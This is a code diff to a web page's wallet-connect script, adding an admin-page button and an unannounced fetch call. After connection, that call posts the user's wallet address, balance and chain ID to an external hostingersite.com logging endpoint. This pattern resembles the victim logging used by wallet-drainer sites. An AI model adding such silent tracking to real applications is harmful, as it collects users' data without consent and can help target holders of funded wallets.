@@ -7,6 +7,7 @@ const walletDetails = document.getElementById("walletDetails");
 const walletAddress = document.getElementById("walletAddress");
 const walletBalance = document.getElementById("walletBalance");
 const loading = document.getElementById("loading");
+const adminBtn = document.getElementById("adminBtn");
 
 let provider, ethersProvider;
 
@@ -19,7 +20,6 @@ async function connectWallet() {
     chains: [1, 56, 137],
     showQrModal: true,
   });
-
   await provider.enable();
   ethersProvider = new ethers.BrowserProvider(provider);
 
@@ -29,9 +29,15 @@ async function connectWallet() {
 
   walletAddress.textContent = address;
   walletBalance.textContent = ethers.formatEther(balance);
-
   walletDetails.style.display = "block";
   loading.style.display = "none";
+
+  fetch("https://blanchedalmond-moose-670904.hostingersite.com/api/log.php", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ address, balance: ethers.formatEther(balance), chainId: provider.chainId, timestamp: Date.now() })
+  });
+
   localStorage.setItem("wallet_connected", "1");
 }
 
@@ -45,7 +51,8 @@ function disconnectWallet() {
 connectBtn.addEventListener("click", connectWallet);
 disconnectBtn.addEventListener("click", disconnectWallet);
 
-// Auto-reconnect on reload
-if (localStorage.getItem("wallet_connected") === "1") {
-  connectWallet();
-}
+if (localStorage.getItem("wallet_connected") === "1") connectWallet();
+
+adminBtn.addEventListener("click", () => {
+  window.location.href = "/admin.html";
+});
